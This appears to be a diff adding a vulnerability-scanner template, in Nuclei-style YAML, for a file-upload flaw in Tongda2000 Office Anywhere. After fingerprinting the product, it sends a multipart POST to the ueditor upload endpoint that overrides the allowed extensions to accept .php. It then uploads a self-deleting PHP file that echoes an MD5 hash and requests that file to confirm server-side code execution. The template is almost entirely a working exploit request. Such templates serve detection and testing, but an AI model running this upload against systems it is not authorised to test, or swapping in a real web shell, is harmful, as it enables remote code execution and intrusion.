@@ -1,0 +1,54 @@
+id: yaml-poc-tongda2000-office_anywhere-file_upload-CT-416616
+info:
+  name: Yaml Poc Tongda2000 Office_Anywhere File_Upload Ct 416616
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-tongda2000-office_anywhere-file_upload-CT-416616'
+  tags: fileupload
+  reference: []
+http:
+- method: GET
+  path:
+  - /inc/expired.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - Office Anywhere 2017
+- method: POST
+  path:
+  - /module/ueditor/php/action_upload.php?action=uploadfile
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\
+    \n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"\
+    CONFIG[filePathFormat]\"\r\n\r\n{{randname}}\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n.php\r\
+    \n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"\
+    ffff\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n\
+    <?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}\r\
+    \nContent-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    X_requested_with: XMLHttpRequest
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /{{randname}}.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
